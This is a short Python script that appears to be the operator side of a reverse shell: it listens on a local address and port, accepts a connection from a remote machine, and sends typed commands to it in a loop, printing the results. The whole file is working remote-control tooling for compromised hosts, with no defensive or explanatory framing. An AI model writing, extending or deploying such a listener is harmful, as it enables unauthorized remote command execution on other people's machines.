#!/user/bin/python

import socket, json
from termcolor import colored

def reliable_send(data):
    json_data = json.dumps(data)
    target.send(json_data.encode('UTF-8'))

def reliable_recv():
    data = ""
    while True:
        try:
            data = data + target.recv(1024).decode('UTF-8')
            return json.loads(data)
        except ValueError:
            continue

def shell():
    while True:
        command = input("* Shell#~%s: " % str(ip))
        reliable_send(command)
        if command == 'quit':
            break
        else:
            result = reliable_recv()
            print(result)

# Create Server
def server():
    global sock
    global ip
    global target
    # Create TCP IPv4 socket object
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # IP and port to bind to
    sock.bind(("192.168.0.21", 54321))
    # Set number of listerners
    sock.listen(5)

    print(colored("[+] Listening for inbound connections.", 'green'))

    target, ip = sock.accept()
    print(colored("[+] Connection established from: %s" % str(ip), 'green'))

server()
shell()
sock.close()